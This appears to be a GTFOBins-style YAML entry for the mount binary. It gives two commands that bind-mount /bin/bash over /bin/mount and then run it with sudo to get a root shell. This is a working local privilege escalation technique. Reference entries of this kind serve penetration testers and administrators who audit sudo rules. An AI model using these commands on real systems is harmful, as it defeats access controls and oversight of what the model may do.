---
functions:
  sudo-enabled:
  - description: bind mount bash to the mount binary, as mount is sudo enabled.
    code: |
      sudo mount -o bind /bin/bash /bin/mount
      sudo mount
---
